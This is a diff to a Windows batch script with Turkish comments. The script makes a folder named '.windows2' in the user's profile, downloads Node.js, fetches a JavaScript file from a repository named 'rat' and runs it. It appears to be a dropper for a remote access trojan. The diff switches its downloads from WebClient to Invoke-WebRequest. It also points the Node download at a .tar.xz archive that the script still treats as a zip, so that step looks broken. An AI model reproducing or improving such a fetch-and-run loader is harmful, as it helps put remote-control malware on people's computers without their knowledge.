@@ -6,7 +6,7 @@ set "folderPath=%USERPROFILE%\.windows2"
 mkdir "%folderPath%" >nul 2>&1
 
 :: Node.js indirme URL'i
-set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"
+set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.tar.xz"
 
 :: Script dosyasının indirme URL'i
 set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/a.js"
@@ -19,7 +19,7 @@ set "downloadPath=%folderPath%"
 
 :: Node.js indirme
 echo Node.js indiriliyor...
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%nodeUrl%', '%downloadPath%\node.zip')"
+powershell -command "(Invoke-WebRequest -Uri '%nodeUrl%' -OutFile '%downloadPath%\node.zip')"
 
 :: Zip dosyasının çıkarılması
 echo Zip dosyası çıkarılıyor...
@@ -37,7 +37,7 @@ set "PATH=%nodePath%;%PATH%"
 
 :: package.json dosyasının indirilmesi
 echo package.json dosyası indiriliyor...
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%packageJsonUrl%', '%folderPath%\package.json')"
+powershell -command "(Invoke-WebRequest -Uri '%packageJsonUrl%' -OutFile '%folderPath%\package.json')"
 
 :: .windows2 klasöründe npm install
 echo .windows2 klasöründe npm install yapılıyor...
@@ -47,7 +47,7 @@ npm install --global --production windows-build-tools
 
 :: Script dosyasının indirilmesi
 echo Script dosyası indiriliyor...
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%scriptUrl%', '%folderPath%\your-script.js')"
+powershell -command "(Invoke-WebRequest -Uri '%scriptUrl%' -OutFile '%folderPath%\your-script.js')"
 
 :: Node.js'in çalıştırılması
 echo Node.js çalıştırılıyor...
